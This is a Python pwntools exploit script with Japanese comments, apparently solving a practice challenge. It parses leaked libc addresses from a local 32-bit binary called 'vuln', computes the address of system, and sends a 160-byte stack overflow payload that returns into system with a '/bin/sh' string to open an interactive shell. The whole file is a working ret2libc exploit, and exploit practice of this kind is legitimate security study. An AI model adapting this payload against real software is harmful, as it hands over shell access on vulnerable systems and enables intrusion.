# coding: utf-8

# libcにあるいくつかの関数のアドレスを出力してくれるので、それを利用してlibcのベースアドレスを求める
# libcのベースアドレスからsystemのアドレスを求め、bofを利用してsystemにリターンする


from pwn import *
import time

bof_offset = 160
context.arch = 'i386'

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
vuln = ELF('vuln')

libc_system_off = libc.symbols['system']
libc_puts_off = libc.symbols['puts']
print('libc_system_offset: 0x%08x' % (libc_system_off))
print('puts_system_offset: 0x%08x' % (libc_puts_off))

p = process('vuln')

ret = p.recvregex(r'puts: 0x.*\n').split(" ")
puts_addr = int(ret[5].replace('\n', ''), 16)

ret = p.recvregex(r'useful_string: 0x.*\n').split(" ")
binsh_addr = int(ret[4].replace('\n', ''), 16)

ret = p.recv(1048)

libc_base = puts_addr - libc_puts_off
libc_system = libc_base + libc_system_off

print('libc_base: 0x08%x: ' % libc_base)
print('system: 0x08%x: ' % libc_system)

payload = 'A' * 160
payload += p32(libc_system)
payload += 'B' * 4
payload += p32(binsh_addr)

p.sendline(payload)
p.interactive()
